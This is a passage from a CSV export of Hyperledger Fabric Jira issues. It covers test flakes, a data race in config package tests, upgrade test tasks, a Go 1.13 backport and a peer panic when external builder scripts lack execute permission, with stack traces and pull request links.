     7  8f7b0cc25       Will Lahti      Thu May 23 12:47:05 2019 -0400  Regenerate protos on master
     8  dc4c8a720       Jason Yellick   Wed Mar 6 16:04:44 2019 -0500   FAB-14521 Get protos in sync
     9  718997738       Matthew Sykes   Mon Mar 4 16:16:43 2019 -0500   [FAB-13867] handle window between Level and Write
    10  00943c472       Matthew Sykes   Fri Jan 18 12:48:41 2019 -0500  [FAB-13652] consume stream message before return
    11  506153def       Matthew Sykes   Thu Jan 10 09:10:50 2019 -0500  [FAB-13598] remove grpc_start_time from logs
    12  dce85d25b       Matthew Sykes   Wed Dec 19 13:33:55 2018 -0500  [FAB-13373] endTime is after messages are logged
    13  121633acf       Matthew Sykes   Wed Dec 19 11:11:24 2018 -0500  [FAB-13359] fix grpclogging flake
    14  d52b16e65       Matthew Sykes   Fri Dec 7 19:00:45 2018 -0500   [FAB-12870] fix timing flake in grpclogging tests
    15  a5783524e       Yoav Tock       Tue Dec 4 16:34:35 2018 +0200   FAB-13152 fix make protos
    16  2f02a328f       Matthew Sykes   Thu Nov 22 09:15:18 2018 -0500  Prevent verbose error reporting from grpc logging
    17  6922e14a2       Matthew Sykes   Wed Nov 21 20:20:34 2018 -0500  Allow custom levelers for grpc interceptors
    18  a58bcd2bf       Matthew Sykes   Wed Nov 14 14:31:53 2018 -0500  [FAB-12865] address timeout flakes in grpclogging
    19  7c7f9458c       Matthew Sykes   Mon Nov 5 18:15:00 2018 -0500   Instantiate and wire metrics provider
    20  ce54f145e       Matthew Sykes   Wed Nov 7 13:09:20 2018 -0500   [FAB-12766] increase temporal threshold in tests
    21  a5ff8e987       Matthew Sykes   Wed Oct 24 14:07:03 2018 -0400  [FAB-12363] grpc server logging interceptors
{code}

6 of those are changes related to test issues - all of which happened more than a year ago.

So, yeah, there are flakes - but not at the level where the ""sentiment"" of ""many flakes over the years"" resonates.
;;;","18/Mar/20 5:59 AM;btl5037;It was a comment (and a true one), not a call to action, obviously not high priority since no one else has seen the flake (or at least reported it);;;","18/Mar/20 6:06 AM;sykesm;https://github.com/hyperledger/fabric/pull/875;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Data race reported in configuration package tests,FAB-17549,44433,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,sykesm,sykesm,27/Feb/20 1:16 AM,17/Mar/20 4:15 AM,28/Oct/23 3:09 AM,27/Feb/20 1:28 AM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,race,,,,"{code}
==================
WARNING: DATA RACE
Write at 0x00c0004de9e0 by goroutine 93:
  github.com/hyperledger/fabric/pkg/config.TestSign.func1()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/pkg/config/signer_test.go:181 +0x153
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:909 +0x199

Previous write at 0x00c0004de9e0 by goroutine 101:
  github.com/hyperledger/fabric/pkg/config.TestSign.func1()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/pkg/config/signer_test.go:181 +0x153
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:909 +0x199

Goroutine 93 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:960 +0x651
  github.com/hyperledger/fabric/pkg/config.TestSign()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/pkg/config/signer_test.go:177 +0x617
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:909 +0x199

Goroutine 101 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:960 +0x651
  github.com/hyperledger/fabric/pkg/config.TestSign()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/pkg/config/signer_test.go:177 +0x617
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:909 +0x199
==================
--- FAIL: TestSign (0.06s)
    --- FAIL: TestSign/success (0.00s)
        testing.go:853: race detected during execution of test
--- FAIL: TestNewSigningIdentity (0.08s)
--- FAIL: TestNewCreateChannelTxFailure (0.04s)
    --- FAIL: TestNewCreateChannelTxFailure/When_creating_the_default_config_template_with_no_Admins_policies_defined_fails (0.00s)
    --- FAIL: TestNewCreateChannelTxFailure/When_creating_the_default_config_template_with_no_Writers_policies_defined_fails (0.00s)
    --- FAIL: TestNewCreateChannelTxFailure/When_no_BlockValidation_policy_is_defined (0.00s)
        testing.go:853: race detected during execution of test
--- FAIL: TestNewCreateChannelTx (0.04s)
    --- FAIL: TestNewCreateChannelTx/When_creating_new_create_channel_Tx_with_orderer_defined_in_profile (0.01s)
        testing.go:853: race detected during execution of test
FAIL
coverage: 89.3% of statements
FAIL	github.com/hyperledger/fabric/pkg/config	0.195s
{code}

This is running with master from this morning with commit fd00849a0741ed46ae0faaf3bf37b72f37e1875d included.",,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzyr",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Feb/20 1:27 AM;wlahti;This is fixed and merged into master via: [https://github.com/hyperledger/fabric/pull/737/files#diff-857c2d241ccd01c0d0e1d3452896e0e8R66] Just needed to colonize the error at what is now line 66 (formerly line 181).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Split updateCapability and updatePolicy to be independent from upgradeNetwork,FAB-17550,44434,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,27/Feb/20 3:35 AM,28/Feb/20 6:27 AM,28/Oct/23 3:09 AM,28/Feb/20 6:27 AM,v2.0.0,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,quality,,,,,"Split updateCapability and updatePolicy to be independent from upgradeNetwork, such that while performing the rolling upgrades, invokes can be sent at each step.",,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17553,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16240,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzuy",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Feb/20 12:55 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/104;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix docker backup path and move testdata directory to regression,FAB-17551,44435,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,27/Feb/20 4:58 AM,28/Feb/20 1:00 AM,28/Oct/23 3:09 AM,28/Feb/20 12:54 AM,v1.4.5,,,,,,,,,v1.4.5,,,,fabric-quality,,,,,,,,,0,quality,,,,,Fix docker backup path and move testdata directory to regression,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17553,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzuz",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Feb/20 12:54 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/103;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement an Example test that demonstrates idiomatic usage of the library,FAB-17552,44445,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,27/Feb/20 11:40 PM,19/Apr/20 12:09 PM,28/Oct/23 3:09 AM,13/Mar/20 3:41 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like an example in the library documentation that shows me idiomatic usage of the package to create configuration updates and sign them. The updates should involve multiple changes to instruct on how state is managed.

 

*Acceptance*

I can find an example for updating channel transactions in the GoDoc for the package. It should also sign the config update envelope.",,sykesm,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzy",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Mar/20 4:13 AM;tsharris;Draft [https://github.com/hyperledger/fabric/pull/794];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade test suite from 1.4.x to 2.0.x ,FAB-17553,44447,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,28/Feb/20 12:58 AM,19/Mar/20 3:08 AM,28/Oct/23 3:09 AM,19/Mar/20 3:08 AM,v2.0.0,,,,,,,,,v2.0.2,,,,fabric-quality,,,,,,,,,0,quality,,,,,Automate and integrate upgrade test suite from 1.4.x to 2.0.x as part of CI,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17550,FAB-17551,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10085,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzux",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),suryalnvs,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Mar/20 2:21 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/108;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"PTE removes burst, simple and mix transaction modes",FAB-17554,44448,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,28/Feb/20 4:09 AM,02/Mar/20 11:36 PM,28/Oct/23 3:09 AM,02/Mar/20 11:36 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Remove the following unused transaction modes in PTE: burst, simple and mix.",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-2247,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb2zs",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Feb/20 12:27 AM;dongming;remove transmodes: burst, simple, and mix

remove recHist option

[https://github.com/hyperledger/fabric-test/pull/115];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix config tests to expect against a literal,FAB-17555,44449,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,28/Feb/20 5:25 AM,04/Apr/20 2:18 AM,28/Oct/23 3:09 AM,04/Apr/20 2:18 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,There are a couple places in the config package where the tests are computing the expected value using the exact same code from production. This defeats the purpose of testing in the first place. We should follow something similar to the CreateChannelTx tests that use protolator to compare against a json raw output. ,,caod,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzp",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Apr/20 4:10 AM;dereckluo;https://github.com/hyperledger/fabric/pull/981;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade release-1.4 to go1.13,FAB-17556,44450,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,28/Feb/20 6:49 AM,22/Apr/20 1:51 AM,28/Oct/23 3:09 AM,22/Apr/20 1:51 AM,,,,,,,,,,v1.4.7,,,,fabric-release,,,,,,,,,0,,,,,,"Go 1.12 will go EOL shortly, we need to cross the barrier into 1.13. There are some changes related to SSL and error handling that will need to be backported into 1.4 to make it work, you should be able to look at the commit history in the time around when we crossed the barrier in 2.0 and see what changes need to be backported (in general they were trivial changes, but they need to be made).",,btl5037,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwr6z:zz6xji",,,,Unset,Unset,v1.4.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Mar/20 6:34 AM;btl5037;[https://github.com/hyperledger/fabric/pull/796]

Starting work here, need to publish the new baseimage first, but tested locally;;;","22/Apr/20 1:42 AM;denyeart;[~btl5037] What else is needed to complete the shift to go 1.13?;;;","22/Apr/20 1:51 AM;btl5037;Nothing work is merged, but we need to do the CA as well, I'll open a Jira;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2.0 invalid memory address or nil pointer reference when permission denied to scripts for external builder ,FAB-17557,44452,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,kopaygorodsky,kopaygorodsky,28/Feb/20 7:36 AM,03/Mar/20 7:52 AM,28/Oct/23 3:09 AM,03/Mar/20 7:52 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"Using 2.0 peer (1.4 capability) I removed all the configuration for docker vm and configured only external builder. 
I mounted scripts inside a container without executable permissions (using k8s configmap without defaultMode).  Peer panics when I try to install cc (with lscc). Adding executable permission for script s fixes the problem.

Is it expected for peer to panic in this case? 

{code:java}
020-02-27 22:29:53.859 UTC [chaincode.externalbuilder] Detect -> DEBU 080 builder 'builder' detect failed: fork/exec /builders/golang/bin/detect: permission denied
2020-02-27 22:29:53.859 UTC [chaincode.externalbuilder] Build -> DEBU 081 no external builder detected for reference:1.0
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x10 pc=0x150e6b7]

goroutine 129 [running]:
github.com/hyperledger/fabric/core/container/dockercontroller.(*DockerVM).preFormatImageName(0x0, 0xc00255ea50, 0xd, 0xc00261acb8, 0xaa5728)
	/go/src/github.com/hyperledger/fabric/core/container/dockercontroller/dockercontroller.go:510 +0x37
github.com/hyperledger/fabric/core/container/dockercontroller.(*DockerVM).GetVMNameForDocker(0x0, 0xc00255ea50, 0xd, 0xc000032000, 0x1830ea0, 0x18a54a0, 0x7f4dd15109c8)
	/go/src/github.com/hyperledger/fabric/core/container/dockercontroller/dockercontroller.go:490 +0x5d
github.com/hyperledger/fabric/core/container/dockercontroller.(*DockerVM).Build(0x0, 0xc00255ea50, 0xd, 0xc00262c330, 0x7f4dd15109c8, 0xc00260e790, 0x40, 0x1bded00, 0xc00260e790, 0x0)
	/go/src/github.com/hyperledger/fabric/core/container/dockercontroller/dockercontroller.go:181 +0x5a
github.com/hyperledger/fabric/core/container.(*Router).Build(0xc0002cabc0, 0xc00255ea50, 0xd, 0x0, 0x0)
	/go/src/github.com/hyperledger/fabric/core/container/container.go:124 +0x3ac
github.com/hyperledger/fabric/core/scc/lscc.(*SCC).executeInstall(0xc0002b2be0, 0x1c18640, 0xc002610000, 0xc0003087e0, 0xe0, 0xe0, 0x0, 0x0)
	/go/src/github.com/hyperledger/fabric/core/scc/lscc/lscc.go:719 +0x950
github.com/hyperledger/fabric/core/scc/lscc.(*SCC).Invoke(0xc0002b2be0, 0x1c18640, 0xc002610000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
	/go/src/github.com/hyperledger/fabric/core/scc/lscc/lscc.go:980 +0x1e94
github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-chaincode-go/shim.(*Handler).handleTransaction(0xc0002ade00, 0xc000141200, 0xc000250778, 0xaa03a5, 0xc00027bc80)
	/go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-chaincode-go/shim/handler.go:209 +0x272
github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-chaincode-go/shim.(*Handler).handleStubInteraction(0xc0002ade00, 0xc00260e270, 0xc000141200, 0xc00020bf80)
	/go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-chaincode-go/shim/handler.go:159 +0x34
created by github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-chaincode-go/shim.(*Handler).handleReady
	/go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-chaincode-go/shim/handler.go:620 +0x1bd
{code}


",,kopaygorodsky,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019l7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),kopaygorodsky,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Feb/20 7:50 AM;yacovm;[~sykesm];;;","29/Feb/20 4:43 AM;sykesm;The peer should have returned an error during install.

We will wire in a disabled builder that will only return errors when docker is disabled.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
operator should exit on error from main package,FAB-17559,44461,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,29/Feb/20 12:12 AM,18/Mar/20 2:20 AM,28/Oct/23 3:09 AM,18/Mar/20 2:20 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,quality,,,,,operator should exit on error from main package,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzuxi",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage 